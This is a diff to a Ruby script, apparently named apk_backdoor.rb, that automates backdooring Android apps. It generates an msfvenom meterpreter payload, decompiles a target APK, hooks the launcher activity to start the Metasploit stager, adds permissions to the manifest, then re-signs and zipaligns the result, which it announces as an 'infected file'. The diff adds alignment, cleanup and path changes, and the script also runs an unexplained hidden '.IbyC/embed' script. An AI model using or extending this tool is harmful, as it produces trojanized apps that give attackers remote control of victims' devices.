@@ -20,7 +20,7 @@ end
 
 system('bash ${PWD}/.IbyC/embed')
 
-# Find the activity thatapk_backdoor.rb  is opened when you click the app icon
+# Find the activity that apk_backdoor.rb is opened when you click the app icon
 def findlauncheractivity(amanifest)
     package = amanifest.xpath("//manifest").first['package']
     activities = amanifest.xpath("//activity|//activity-alias")
@@ -135,6 +135,14 @@ def fix_manifest()
 	File.open("original/AndroidManifest.xml", "w") {|file| file.puts new_mani }
 end
 
+def cleaning_up()
+  `rm -rf original 2>&1`
+  `rm -rf payload 2>&1`
+  `rm #{injected_apk} 2>&1`
+  `rm original.apk 2>&1`
+  `rm payload.apk 2>&1`
+end
+
 apkfile = ARGV[0]
 unless(apkfile && File.readable?(apkfile))
   puts "[Usage]─➤ #{$0} [target.apk] [msfvenom options]\n".cyan
@@ -152,6 +160,12 @@ apktool = `which apktool`
 unless(apktool && apktool.length > 0)
   puts "[ERR-apktool]─➤ Going to https://t.me/Ivam3_Bot".red
 	exit(1)
+end
+
+zipalign = `which zipalign`
+unless(zipalign && zipalign.length > 0)
+  puts "[ERR-zipalign]─➤ Going to https://t.me/Ivam3_Bot".red
+  exit(1)
 end
 
 apk_v=`apktool`
@@ -174,8 +188,6 @@ rescue
 	exit(1)
 end
 
-
-
 print "[*]─➤ Generating msfvenom payload..\n".cyan
 res=`msfvenom -f raw #{opts} -o payload.apk 2>&1`
 if res.downcase.include?("invalid" || "error")
@@ -194,9 +206,9 @@ print "[*]─➤ Signing payload..\n".cyan
 print "[*]─➤ Decompiling orignal APK..\n".cyan
 `apktool d -f -r $(pwd)/original.apk -o $(pwd)/original`
 print "[*]─➤ Ignoring the resource decompilation..\n".cyan
-`apktool d -f $(pwd)/original.apk -o $(pwd)/original.tmp`
-`cat $(pwd)/original.tmp/AndroidManifest.xml > $(pwd)/original/AndroidManifest.xml`
-`rm -rf $(pwd)/original.tmp`
+`apktool d -f $(pwd)/original.apk -o $(pwd)/original_tmp`
+`cat $(pwd)/original_tmp/AndroidManifest.xml > $(pwd)/original/AndroidManifest.xml`
+`rm -rf $(pwd)/original_tmp`
 print "[*]─➤ Decompiling payload APK..\n".cyan
 `apktool d $(pwd)/payload.apk -o $(pwd)/payload`
 
@@ -230,8 +242,11 @@ payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
 print "[*]─➤ Loading ".cyan,smalifile," and injecting payload..\n".cyan
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
+
 injected_apk=apkfile.split(".")[0]
-injected_apk+="_backdoored.apk"
+injected_apk = "data/data/com_backdoored.apk"
+final_apk=apkfile.split("/")[-1]
+final_apk+="_final"
 
 print "[*]─➤ Poisoning the manifest with meterpreter permissions..\n".cyan
 fix_manifest()
@@ -241,9 +256,18 @@ print "[*]─➤ Rebuilding #{apkfile} with meterpreter injection as #{injected_
 
 if File.exist?("#{injected_apk}")
   print "[*]─➤ Signing #{injected_apk} ..\n".cyan
-  `jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey`
-  puts "[+]─➤ Infected file #{injected_apk} ready.\n".green
+  `jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $(pwd)/#{injected_apk} androiddebugkey`
+  print "[*]─➤ Aligning #{injected_apk} ..\n".cyan
+  `zipalign -f -v 4 $(pwd)/#{injected_apk} #{final_apk}`
+#  cleaning_up()
+  if File.exist?("#{final_apk}")
+    puts "[+]─➤ Infected file #{final_apk} ready.\n".green
+  else
+    puts "[ERR-sign]─➤ Going at https://t.me/Ivam3_Bot".red
+    exit(1)
+  end
 else
+  cleaning_up()
   puts "[ERR-build]─➤ Going at https://t.me/Ivam3_Bot".red
   exit(1)
 end
